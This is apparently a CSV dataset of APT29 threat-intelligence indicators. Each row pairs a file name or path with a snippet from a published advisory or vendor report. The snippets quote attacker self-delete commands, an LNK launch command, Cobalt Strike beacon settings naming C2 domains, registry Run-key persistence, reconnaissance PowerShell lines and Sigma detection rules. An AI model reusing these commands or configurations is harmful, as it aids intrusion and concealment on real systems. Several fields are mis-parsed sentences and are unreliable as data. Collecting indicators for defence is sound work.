1.0.0,actor--apt29,artifact--sha256:9f0268eb6cbc372edf80e771f243da26cc617c4203ff5a2040ba610c5ec91309,observation--sha256:36625861e0f43aa4940f24e2a2395b7ac0e008cbb35f9edaf2b99ae1fbf9729d,file-name,wasdeliveringtheInformation.zipfileviaInformation.php,wasdeliveringtheInformation.zipfileviaInformation.php,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA QuarterRigActivity:MaytoJune2023OnMay22, 2023, Insikt Groupidentifiedanother compromiseddomain, easym6 .]com, whichhostedaPHPfilethat deliveredaQuarterRigsamplethat beaconstoactor-controlledinfrastructure. UsersredirectedtotheURLhxxps://easym6 .]com/Information.phpwoulddownloadaZIPfiletitledInformation.zipfile SHA256b422ba73f389ae5ef9411cf4484c840c7c82f2731c6324db0b24b6f87ce8477d). InadditiontoQuarterRig, Information.zipincludes3other filesessential totheexecutionandf",
1.0.0,actor--apt29,artifact--sha256:1b22692feab7b795c9b09840430fbbc3ddbf2b0658470e62873550ae09b96d6e,observation--sha256:20199faf9eb8b6808f1c76c284e483b9d5fe60cdbe9bcf7c952fdb9e1f560276,file-name,whitepaper.pdf,whitepaper.pdf,candidate,,unknown,unknown,not-stated,,source--apt29--49eb8cd46560323f,APT29/F-Secure_Dukes_Whitepaper.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"F-Secure Whitepaper, September 2015 26 A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. In the case of CVE-2010-0232, the exploit appears to be based directly on the proof of concept code published by security researcher Tavis Ormandy when he disclosed the vulnerability [4]. We believe that the exploit for CVE- 2010-4398 was also based on a publicly ava",
1.0.0,actor--apt29,artifact--sha256:be913ac15e3fadc0af570a10298163936c15726005cf538b2a15e9babcf65232,observation--sha256:4972fbb7987969ad890ddf78571ad6481584b9af2586fbdc28cf5835159b1dd8,file-name,whoami.exe,whoami.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 14 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Exfiltration Over C2 Channel T1041 SVR cyber actors may steal data by exfiltrating it over an existing C2 channel. Stolen data is encoded into normal communications using the same protocol as C2 communications. Exfiltration Over Web Service T1567 SVR cyber actors use OneDrive and Dropbox to exfiltrate data to their C2 station. INDICATORS OF COMPROMISE Note: Please refer to Appendix B for a list of IOCs. VICTIM TY,
1.0.0,actor--apt29,artifact--sha256:be913ac15e3fadc0af570a10298163936c15726005cf538b2a15e9babcf65232,observation--sha256:637f020a42f0e1820659f7037098134f707144cd41b88b0b393534ac85dcaac0,file-name,whoami.exe,whoami.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:78b37cd8908ad0ac384c92990a0e0b8bf816f32e3c67ca179230b660c1e86d0e,observation--sha256:bc54d5430a0ff7d159d8262f2b3cbd85535a733d996ee971356a3217e2454241,file-name,windoc.exe,windoc.exe,candidate,,unknown,unknown,not-stated,,source--apt29--59d79eb119d7d95b,APT29/APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS| RUSSIA Whenavictimtriestoopenanyof theLNKfiles, it triggerstheexecutionof thecommandcmd /cstart .$Recycle.Bin\windoc.exe && "".$Recycle.Bin\bmw[X].png"". Thiscommandisusedtolaunchwindoc.exeandopenaPNGfilecorrespondingtothenumber of theLNKfileopened.Windoc.exeservesastheinitial executionpoint for themalware, whilethePNGfileactsasadecoytodivert attentionawayfromthemalwareasit beginsitsexecutionwithintheWindoc.exeprocess. Windoc.exeisabenigncopyof theMicrosoft Wordapplicationthat",
1.0.0,actor--apt29,artifact--sha256:0e710d404739ac488061eb1aa8dc78841be3c04857e2b9895bc4a51e86920fe4,observation--sha256:78e66fec8d3a7158147a0f42676212ec7c21ece31bed5867cf8f468780d968cf,file-name,winhttp.dll,winhttp.dll,candidate,,unknown,unknown,not-stated,,source--apt29--813411ec01acb3f6,APT29/CERT.PL/IoC_Reference_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/11 Indicator Value Virtual disc container File Name Invite.iso File Size 6464KB MD5 1609bcb75babd9a3e823811b4329b3b9 SHA1 86dcdf623d0951e2f804c9fb4ef816fa5e6a22c3 SHA256 91b42488d1b8e5b547b945714c76c2af16b9566b35757bf055cec1fee9dff1b0 Indicator Value Legitimate executable used to load the malicious DLL File Name Invite.exe File Size 5380KB MD5 d2027751280330559d1b42867e063a0f SHA1 15511f1944d96b6b51291e3a68a2a1a560d95305 SHA256 35271a5d,
1.0.0,actor--apt29,artifact--sha256:0e710d404739ac488061eb1aa8dc78841be3c04857e2b9895bc4a51e86920fe4,observation--sha256:e2b2a477ee38e3407198f9e0b539e9060d0ab862e3f5718a43d1f8532ac25b09,file-name,winhttp.dll,winhttp.dll,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 32/36 Indicator Value Virtual disc container File Name Invite.iso File Size 6464KB MD5 1609bcb75babd9a3e823811b4329b3b9 SHA1 86dcdf623d0951e2f804c9fb4ef816fa5e6a22c3 SHA256 91b42488d1b8e5b547b945714c76c2af16b9566b35757bf055cec1fee9dff1b0 Indicator Value Legitimate executable used to load the malicious DLL File Name Invite.exe File Size 5380KB MD5 d2027751280330559d1b42867e063a0f SHA1 15511f1944d96b6b51291e3a68a2a1a560d95305 SHA256 35271a5,
1.0.0,actor--apt29,artifact--sha256:1291b1d2d3eb4fea0f6e7c4dba72398bc13ded7b25771adf35f50ef87fe84676,observation--sha256:43b6ab8216d100b2aa2562e3572300733649da58953d08ad30cb9fcdc7abe0fd,file-name,wp-assets.php,wp-assets.php,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 20}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Depending on the analysis made on the TDS panel, the PTI Team believes that the traffic distribution is achieved by injecting the following malicious PHP and JavaScript codes into multiple legitimate websites. Injected code checks the host, referrer, and cookie headers for the expected values on every incoming request and sends an HTTP GET request to the hxxp://mwkh.adsprofitnetwork.com/wordpressComposerUpdate ?phpcid=250&php address by appending the &hn=%URL-ENCOD",
1.0.0,actor--apt29,artifact--sha256:fb93ab95c410c09ef76714ba65f2179dc2835f4ef38d03cf04346906e6913284,observation--sha256:8b88f5fc7792046f796bda11a8579bc78bd3b16198dc67c12d8fa8b23231944e,file-path,"%APPDATA_LOCAL%\7zaand creates the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7zawith a value of%APPDATA_LOCAL%\7za\7za.exe. This enables GraphicalNeutrinoto be executed again when thevictim machine is rebooted; however, in this particular sample, persistence is not established becausethe process filename isnovember_schedulexe.pdfinsteadof 7za.exe.","%APPDATA_LOCAL%\7zaand creates the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7zawith a value of%APPDATA_LOCAL%\7za\7za.exe. This enables GraphicalNeutrinoto be executed again when thevictim machine is rebooted; however, in this particular sample, persistence is not established becausethe process filename isnovember_schedulexe.pdfinsteadof 7za.exe",candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS victim’s machine. The DLL is written in C   and contains only 1 export function  DeviceAll), whichsimply returns when called. The actual malicious code is implemented in a thread that is spawned inDLLMain during the DLL’s initialization. Multiple anti-analysis and evasion techniques are usedthroughout the malware including API unhooking, dynamically resolving APIs, string encryption, andsandbox evasion. When GraphicalNeutrino starts a thread, it attempts to remove any API h",
1.0.0,actor--apt29,artifact--sha256:4cd15c356bd80556f081bf1fafbfda6d746b1d42759174a0a3031edaf294a5d7,observation--sha256:5abcc5bf50f597a59a02001249e8a2eb6803ba1677c6137eda77327c87a76308,file-path,%APPDATA_LOCAL%\photosand the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7za updateis then created with avalue of%APPDATA_LOCAL%\photos\photos_and_price.exe.,%APPDATA_LOCAL%\photosand the registry keyHKCU\Software\Microsoft\Windows\CurrentVersion\Run\7za updateis then created with avalue of%APPDATA_LOCAL%\photos\photos_and_price.exe,candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS Once the shellcode is decrypted, it is indirectly spawned in a new thread byabusing FLS callbacks toobtain execution control as shown inFigure 14. Ratherthan specifying the shellcode’s address as thestart address for the thread, NTDLL’s rtlFlsAlloc is used instead. The rtlFlsAlloc function is used toallocatefiber local storageand takes a callbackfunction as an argument. GraphicalNeutrino creates thethread in a suspended state and updates the thread’s context to have the RCX",
1.0.0,actor--apt29,artifact--sha256:4e96fc99f35d07270e0a46d82ab3e837ce9096f838c6ace71216dfa65111d4fe,observation--sha256:2742c8604dc4a15d7fb849ba08ab13dbf2d13bcfa3d30d73103c56d589ff8397,file-path,%AppData%\Roaming\Mozilla\Firefox\,%AppData%\Roaming\Mozilla\Firefox\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 103}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"102Easter Bunny The C2 server wants to select the sixth credential: :j65i 5 In this case, the result returned would be similar to the following: 0 http://10.0.0 1 admin1 test1234 1 http://10.0.0.1 admin2 test4567 2 http://10.0.0.1 admin3 test8901 3 http://10.0.0.1 admin4 testabcd 4 http://10.0.0.1 admin5 testABCD 5 > > http://10.0.0.1 admin6 testtest EXAMPLE OF USE This command allows you to update the connection mode (the default is authenticated proxy) stored in %AppData%\Roaming\Mozilla\Firef",
1.0.0,actor--apt29,artifact--sha256:f3d80a6f4237afe4d44b1c367d34788b7048891c78ce336a2417cf8b12a83bcf,observation--sha256:a94be23890881ebe00d5f530fcdd6616b7974cccbae5637f0837612f319a1c59,file-path,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 97}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"96Easter Bunny This command allows you to process a command sent from the C2 encoded in Base64. The encoded command will have a fixed structure so that it can be processed correctly: 3.4.3. 1 SEND COMMAND If we want it to be executed in iteration 2, we will encode the following in Base64: EXAMPLE OF USE 2 0 %SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME% $(COMPUTERNAME) COMPUTERNAME Finally, it will send the following command: :mnxqsq MgowCiVTWVNURU1ST09UJVxTeXN0ZW0",
1.0.0,actor--apt29,artifact--sha256:708174192416d06893da092190b93baf07c6dffc146155b63e1f14c82878af66,observation--sha256:b5339eac275f3de73f1272a7b870c099b81e5eb874cb6946623ccf53f2f25521,file-path,%SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,%SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 100}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5299 If Subkey 6 does not exist, the function returns a default value with the following fields: <iteration> : Value between 5 and 20 (depending on each sample) <id> : 0 <command> : %SystemRoot%\System32\cmd.exe /c “ping 127 .0.0.1 -n 30 & del /F “%PROCESSOR_IDENTIFIER%” <EnvironmentVariableExpanded> : $(PROCESSOR_IDENTIFIER) <EnvironmentVariable> : PROCESSOR_IDENTFIER This command returns the Accept and User-Agent headers in the result. 3.4.3.4 GET HEADERS Illustration 94. GET HEAD",
1.0.0,actor--apt29,artifact--sha256:24ce9764d3052850018274e4fbdaa600dbf2875d3de2d59b236c4fdc650fd9d6,observation--sha256:0890d172f9c869282f25c868bbdd240510a087a1c308fb6312789dfb18867222,file-path,%SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH%,%SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH%,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 108}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB52107 This command allows you to execute the following command: %SytemRoot%\System32\cmd.exe ping 127.0.0.1 -n 30 & del /F %EXE_PATH% The purpose of the command is to delete the executable from the disk as a means of concealment. It matches the default command and will be executed if the command includes the argument “-die.” 3.4.3. 10 KILL Illustration 101. KILL function If execution fails, the result will display an error “key_word”. payload",
1.0.0,actor--apt29,artifact--sha256:80756818627a51ca63317f7efa29ca1efae5246a1e4200c6a4ab05e06195a01c,observation--sha256:91ecfad6699860485d1347f8fb6fd66880c4ee25cb094ad717440e3e7963f1a8,file-path,%windir%\\sysnative\\powercfg.exe,%windir%\\sysnative\\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:1df84cea6b8b9aff7d7ba4098e2bad21c14738bc1deb112e8fb769377e4a7969,observation--sha256:5f7b2d8e2f88390c38e60ee5de672bb4000a339c52ef093f1c826cf524ae5183,file-path,%windir%\\syswow64\\powercfg.exe,%windir%\\syswow64\\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 14/20 Cobalt Strike Configuration The listing below presents CobaltStrike beacon configuration: 1. { 2. ""BeaconType"": [ 3. ""HTTPS"" 4. ], 5. ""Port"": 443, 6. ""SleepTime"": 60000, 7. ""MaxGetSize"": 1398102, 8. ""Jitter"": 18, 9. ""C2Server"": ""communitypowersports.com,/owa/L7k2NQpwPNLq4C2dHD6TRv00GCH1axhaWv"", 10. ""HttpPostUri"": ""/owa/o9besAWTTVJKNeyrfOOy2tn-epXE7f"", 11. ""Malleable_C2_Instructions"": [ 12. ""Base64 URL-safe decode"" 13. ], 14. ""HttpGe",
1.0.0,actor--apt29,artifact--sha256:586def7b2aaa4862f3d1af15f5fb2b1b61bd1e9b1b6cfe152a4567e40c03bceb,observation--sha256:26f484165a34bca02648a22c46b81bc9804de481fb81f0db18394e9ad3f886e1,file-path,%windir%\sysnative\dllhost.exe,%windir%\sysnative\dllhost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/24 Payloads We have managed to collect two variants of payloads delivered via SNOWYAMBER: 1. CobaltStrike Beacon. Presented below is an extracted beacon configuration16: BeaconType - HTTPS Port - 443 SleepTime - 37000 MaxGetSize - 1048576 Jitter - 33 MaxDNS - Not Found PublicKey_MD5 - 92b602d1008704ef300d29ca014c6e21 C2Server - humanecosmetics.com,/category/noteworthy/6426- 7346-9789 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64",
1.0.0,actor--apt29,artifact--sha256:f0b8f6d3a7e0b3d9deb8fdebfa5f4049797e1e67de34053675d6b69323fd32e7,observation--sha256:0df5db800a3f1706f5ed36f2bace4078b39ce0a0b84355c715cec3e25775f150,file-path,%windir%\sysnative\powercfg.exe,%windir%\sysnative\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:f0b8f6d3a7e0b3d9deb8fdebfa5f4049797e1e67de34053675d6b69323fd32e7,observation--sha256:a1991e48498ea81fea30c3b44f114459677507dd11e24f9a197e9aa46b8141b7,file-path,%windir%\sysnative\powercfg.exe,%windir%\sysnative\powercfg.exe,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 26/36 CS Beacon #2 (March 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/se9fW4z8WJtmMyPQu UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusI",
1.0.0,actor--apt29,artifact--sha256:f0b8f6d3a7e0b3d9deb8fdebfa5f4049797e1e67de34053675d6b69323fd32e7,observation--sha256:db004729f259650b5545c7dbbebb699cb69d6985ff4b2b3c6776ed180b7fcf9f,file-path,%windir%\sysnative\powercfg.exe,%windir%\sysnative\powercfg.exe,candidate,2021-10-08T00:00:00Z,day,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 28/36 CS Beacon #3 (April 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/8PaDBDxLtokI3eH8 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusIU",
1.0.0,actor--apt29,artifact--sha256:7eace05587f88d9bcc47c3258e0f22c814d2094e9e708e166549b404360d43bf,observation--sha256:98ecff8615ca3b8d6024fa4a657b3bdbd301d51b32d2f409c527db090ff352ae,file-path,%windir%\syswow64\dllhost.exe,%windir%\syswow64\dllhost.exe,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 16/24 Payloads We have managed to collect two variants of payloads delivered via SNOWYAMBER: 1. CobaltStrike Beacon. Presented below is an extracted beacon configuration16: BeaconType - HTTPS Port - 443 SleepTime - 37000 MaxGetSize - 1048576 Jitter - 33 MaxDNS - Not Found PublicKey_MD5 - 92b602d1008704ef300d29ca014c6e21 C2Server - humanecosmetics.com,/category/noteworthy/6426- 7346-9789 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64",
1.0.0,actor--apt29,artifact--sha256:7963f0643b55a6ba044f1e4077bba2ab8c18b61263b18fafd65de74f179eb9e1,observation--sha256:81aec9ec24f2b5a579795c288cb1ee53cbfc9928396933a8c66eb2f4a48c28c5,file-path,%windir%\syswow64\powercfg.exe,%windir%\syswow64\powercfg.exe,candidate,,unknown,unknown,not-stated,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL QUARTERRIG | 25/36 SSH_Banner - HttpGet_Verb - GET HttpPost_Verb - POST HttpPostChunk - 0 Spawnto_x86 - %windir%\syswow64\powercfg.exe Spawnto_x64 - %windir%\sysnative\powercfg.exe CryptoScheme - 0 Proxy_Config - Not Found Proxy_User - Not Found Proxy_Password - Not Found Proxy_Behavior - Use IE settings Watermark_Hash - Not Found Watermark - 1359593325 bStageCleanup - True bCFGCaution - False KillDate - 0 bProcInject_StartRWX - True bProcInject_UseRW,
1.0.0,actor--apt29,artifact--sha256:7963f0643b55a6ba044f1e4077bba2ab8c18b61263b18fafd65de74f179eb9e1,observation--sha256:3e63e239db8a8c95bb977124315fb5c297c29eb056d5e4a270cbb9f3670a6201,file-path,%windir%\syswow64\powercfg.exe,%windir%\syswow64\powercfg.exe,candidate,2021-10-01T00:00:00Z,month,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 26/36 CS Beacon #2 (March 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/se9fW4z8WJtmMyPQu UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusI",
1.0.0,actor--apt29,artifact--sha256:7963f0643b55a6ba044f1e4077bba2ab8c18b61263b18fafd65de74f179eb9e1,observation--sha256:e72493fbba0a57190dcdc26b33880fb139d48373f4a17cb54a3d65666a12b2cf,file-path,%windir%\syswow64\powercfg.exe,%windir%\syswow64\powercfg.exe,candidate,2021-10-08T00:00:00Z,day,known,same-record,,source--apt29--2dacc4165567600f,APT29/CERT.PL/QUARTERRIG_.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL QUARTERRIG | 28/36 CS Beacon #3 (April 2023) BeaconType - HTTPS Port - 443 SleepTime - 60000 MaxGetSize - 1048576 Jitter - 14 MaxDNS - Not Found PublicKey_MD5 - 4f28e1fdb295d14bfabc73bf0314a161 C2Server - gatewan.com,/c/msdownload/update/others/2021/10/8PaDBDxLtokI3eH8 UserAgent - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 HttpPostUri - /c/msdownload/update/others/2021/10/PgYhuOrusIU",
1.0.0,actor--apt29,artifact--sha256:863d2cf8ebdc145db2a305464861a4662e863651fe0d80fb1d28630b7d36af2d,observation--sha256:d65116f9e97d1eea033a9b54f60ff56cbd26d87724ba185029e993f3300faf4d,file-path,C:\ Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd,C:\ Program Files (x86)\PatchManagementInstallation\Agent\12\Httpd,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:0d55eaaaf34c67b93d5d8e9f18a6774fe940f012db44f97b05a60f8a90162813,observation--sha256:f30ca6a3dd61e5fbb6e661e0c45edff8ec784a32ac6add723a77af3f13105ce3,file-path,C:\ ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf,C:\ ProgramData\GFI\LanGuard 12\HttpdConfig\httpd.conf,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 4 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  wmic process where name=""""GoogleCrashHandler64.exe"""" get commandline,processed  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties  powershell ([adsisearcher]""((samaccountname=<redacted>))"").Findall().Properties.memberof  powershell Get-WmiObject -Class Win32_Service -Computername  powershell Get-WindowsDriver -Online -All File Exfiltration Additionally, the authoring agencies ha",
1.0.0,actor--apt29,artifact--sha256:8a5b477b7de2f8bc45010ddff4a797f9cc31927e5241e1b11672d8c232f4ecb8,observation--sha256:2d49d19c7bf53f6a867e7325303a1cc7f1e3a913fdc102038b1001a5f03a09d2,file-path,C:\Intel\,C:\Intel\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,14Easter Bunny Table 2. Location of artifacts NAME DIRECTORY Implant1.exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\ CoreCon\12.0\Target\wce400\x86\ Implant2.exe C:\ProgramData\Adobe\ARM\{a9e64e72-4bcd-e101-e557- 8036f50410e5}\ Implant3exe C:\Program Files (x86)\Common Files\microsoft shared\Phone Tools\12.0\Debugger\target\x86\ Implant4.exe C:\Program Files (x86)\Common Files\InstallShield\Driver\10\Intel 32\ Implant5.exe C:\ProgramData\Adobe\ARM\Reader_11.0. 12\1908\ Imp,
